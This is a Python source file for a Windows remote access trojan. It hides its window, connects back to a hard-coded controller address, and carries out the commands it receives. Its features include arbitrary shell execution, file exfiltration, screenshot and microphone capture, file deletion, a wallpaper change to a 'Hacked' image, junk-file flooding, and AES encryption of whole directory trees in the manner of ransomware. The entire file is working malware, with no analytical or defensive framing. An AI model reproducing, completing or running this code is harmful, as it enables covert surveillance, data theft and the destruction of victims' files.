import win32gui, win32con

hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hide, win32con.SW_HIDE)
import os
from random import randint
from ctypes import windll
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import PIPE, Popen

cnt_image = cnt_record = 0x1


# constant values
SPI_SET_DESKTOP_WALLPAPER = 0x14
PATH_TO_IMAGE = r"C:\Users\Public\Public Pictures\Hacked Picture.png"  # image to change 'can use any format of images jpg,png ..'
SIZE = 0x400  # size of buffer to receive and send


def setup_req() -> None:
    # install all requirements
    requirements = [
        "scipy",
        "Pillow",
        "sounddevice",
        "pycryptodome",
        "pycryptodomex",
        "pwntools",
        "win32gui",
        "pywin32",
        "win32con",
    ]
    for requirement in requirements:
        Popen(
            f"python -m pip install {requirement}",
            shell=True,
            stderr=PIPE,
            stdin=PIPE,
            stdout=PIPE,
        )


# because python interpreter line by line we can install the requirements then complete program
# setup_req()

from scipy.io.wavfile import write
import sounddevice as sd
from PIL.ImageGrab import grab
from Crypto.Cipher import AES
from hashlib import sha256
from struct import calcsize


def is_64_windows() -> bool:
    # The 'calcsize' function is used to determine the size of C data types.
    #'P' represents a pointer-sized integer, and multiplying it by 8 gives the number of bits.

    return calcsize("P") * 0x8 == 0x40  # determan it's 64 or 32 bit


def get_system_info() -> windll:
    """Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function."""
    # The 'windll.user32.SystemParametersInfoW' function is used on 64-bit Windows.
    # The 'windll.user32.SystemParametersInfoA' function is used on 32-bit Windows.
    # This function allows us to change various system parameters, including the desktop wallpaper.
    return (
        windll.user32.SystemParametersInfoW
        if is_64_windows()
        else windll.user32.SystemParametersInfoA
    )


def worm(path=".") -> str:
    conn.sendall("[*] starting worm\n".encode())
    for idx in range(0x64):
        with open(path + str(randint(0x0, 0x10000000000000000)), "w") as file:
            file.write("catch me if you can ^_-")


def change_desktop_background() -> None:
    # Call the 'SystemParametersInfo' function to set the desktop wallpaper.
    # It takes four parameters: the first is the SPI_SET_DESKTOP_WALLPAPER flag for setting the wallpaper,
    # the second is not used (passing 0), the third is the path to the wallpaper image,
    # and the fourth is a combination of options (in this case, 3 to apply the change immediately).
    system_info = get_system_info()
    system_info(SPI_SET_DESKTOP_WALLPAPER, 0x0, PATH_TO_IMAGE, 0x3)
    conn.sendall("[*] background has been changed\n".encode())


# utf-8 utf-16
def pad(data: bytes) -> bytes:
    while len(data) % 16 != 0x0:  # padded 16 byte to block size
        data += b"p"
    return data


def encrypt_file(keys: str, ivs: str, file_path: str):
    # This function encrypts the contents of a file using AES encryption in CBC mode with the provided keys and IV.
    info = f"[*] file {file_path} has been encrypted\n"
    conn.sendall(info.encode())
    data = b""
    # Convert the provided keys and IVs to their corresponding hashes using SHA256.
    key = sha256(keys.encode()).digest()
    # Use the first 16 bytes as the IV (Initial Vector).
    iv = sha256(ivs.encode()).digest()[:0x10]
    with open(file_path, mode="rb") as input_file:  # read data
        data = input_file.read()
    data = pad(data)  # padded to block size 16 byte
    # Create an AES cipher object with the provided key, mode (Cipher Block Chaining), and IV.
    cipher = AES.new(key=key, mode=AES.MODE_CBC, IV=iv)
    # Encrypt the data using the AES cipher.
    enc = cipher.encrypt(data)
    # Write encrypted data into same file name
    with open(file_path, mode="wb") as output_file:
        output_file.write(enc)
    """
    Note:this encryption can break with IV Reuse (Initialization Vector) attack: If an attacker observes two ciphertexts encrypted with the same key and IV, they may perform XOR operations on the ciphertext blocks to cancel out the effects of the IV and potentially reveal information about the plaintext.
    and Meet In The Middle Attack because there are multiple files have same encryption 
    and reverse eng with netowrk analysis
    otherwise no!
    """


def start_encryption(key: str, iv: str, path: str = "."):
    # This function starts the encryption process for all files in the specified directory (and its subdirectories).
    for root, dirs, files in os.walk(path, topdown=True):
        for file in files:
            path_to_file = os.path.join(root, file)
            encrypt_file(key, iv, path_to_file)
    return "\n"


def system(command: str) -> str:
    try:
        os.system(command)
        # deal with kernal for this commend ex:cd ,chmod ,sudo ..
    except Exception:
        return


def send_file(file_name: str) -> str:
    try:  # read file
        file_name = os.path.abspath(file_name)
        conn.send(
            (str(os.path.getsize(file_name)) + "#^" + file_name + "#^").encode()
        )  # send file size and file name seperate by #^
        with open(file_name, "rb") as file:  # read data from file
            chunck = file.read(SIZE)
            while chunck:
                conn.sendall(chunck)  # send 1024 byte
                chunck = file.read(SIZE)
        return "\n"
    except Exception as e:
        return "[*] error"


def take_screenshot() -> str:
    global cnt_image
    img_path = f"screen{cnt_image}.png"  # path where image saved
    cnt_image += 1
    screenshot_ = grab()  # take screen shot
    screenshot_.save(img_path)  # save it in path
    send_file(img_path)  # send it
    remove(img_path)  # then remove it
    return "\n"


def microphone_record(seconds: int) -> str:
    global cnt_record
    file_name = f"records{cnt_record}.wav"  # path to hidden
    cnt_record += 0x1
    sample_rate = 0xAC44  # 44,100 Hz (standard for audio CDs)
    rec = sd.rec(
        frames=seconds * sample_rate, samplerate=sample_rate, channels=2
    )  # Start recording audio for the specified duration, sample rate, and number of channels
    sd.wait()  # Wait for the recording to complete before proceeding
    write(filename=file_name, rate=sample_rate, data=rec)  # save record
    send_file(file_name)  # send it
    remove(file_name)  # remove from device
    return "\n"


def change_dir(path: str) -> str:
    try:
        os.chdir(str(path))  # change directory
        return "\n"
    except NotADirectoryError:  # handling errors
        return "You have not chosen a directory."
    except FileNotFoundError:
        return "The folder was not found. The path is incorrect."

    except PermissionError:
        return "You do not have access to this folder/file."
    except:
        return "Not valid command"


def remove(file_name: str) -> str:
    try:
        if os.path.isfile(file_name):
            os.system(f"del {file_name}")  # delete files
        else:
            os.system(f"rmdir {file_name}")  # delete directory
        return "\n"
    except Exception:
        return "\n"


def cmd_output(command: str) -> str:
    output = Popen(
        command, shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE
    )  # execute any commend line and print output
    return "\n" + "\n".join(
        output.stdout.read().decode().splitlines()
        + output.stderr.read().decode().splitlines()
    )  # return output and errors after execute command


def filter_command(command: str) -> str:
    commandToFilter = command.split()
    if not commandToFilter:
        return
    elif commandToFilter[0] == "alert":
        change_desktop_background()
        worm()
        return "\n"

    elif "screen" == commandToFilter[0x0]:
        return take_screenshot()
    elif (
        commandToFilter[0x0] == "encrypt"
    ):  # encrypt all files and subfiles in directory
        if commandToFilter[0x1] == "1":
            return start_encryption(*commandToFilter[0x2:])
        else:
            encrypt_file(*commandToFilter[0x2:])  # encrypt file you choose it
            return f"file {commandToFilter[-0x1]} has been encrypted"
    elif (
        commandToFilter[0x0] == "download" or commandToFilter[0x0] == "send"
    ):  # send files
        if len(commandToFilter) == 2:
            return send_file(commandToFilter[-0x1])
        else:
            name = command.lstrip("download")
            name = name.lstrip("send")
            name = name.strip()
            return send_file(name)
    elif "cd" == commandToFilter[0x0]:  # change dir
        return change_dir(commandToFilter[0x1])
    elif (
        "nano" == commandToFilter[0x0] or "notepad" == commandToFilter[0x0]
    ):  # deal with kernal and gnu
        system(command)
    elif (
        "del" == commandToFilter[0x0]
        or "rmdir" == commandToFilter[0x0]
        or "rm" == commandToFilter[0x0]
    ):  # remove file/dir
        remove(*commandToFilter[0x1:])
    elif "record" == commandToFilter[0x0]:  # record microphone
        return microphone_record(int(commandToFilter[0x1]))
    else:
        try:
            return cmd_output(
                command
            )  # output for commaned has output ex: ls ,cat ,open ,ipconfig..
        except Exception:
            try:
                return system(command)  # command don't have output such as cd
            except Exception:
                return "error"


def try_connect():  # thread for new connection
    global conn, ADDR
    while True:
        try:
            conn = socket(AF_INET, SOCK_STREAM)
            conn.connect(ADDR)
            return
        except:
            pass


ADDR = ("192.168.1.244", 0xDEAD)
conn = socket(AF_INET, SOCK_STREAM)  # connection orinated
try_connect()  # try connect
while True:
    try:
        command = conn.recv(SIZE).decode()  # recv command
        output = filter_command(command)  # filter command
        if isinstance(output, str):  # if output is str send it otherwise send new line
            while output:
                bytes_sent = conn.sendall(
                    (output[:SIZE]).encode()
                )  # send all output we creat this buffer to send big outputs such that read big file,ls in big dir and so on
                output = output[SIZE:]
        else:
            conn.send("\n".encode())
    except Exception as e:
        try_connect()
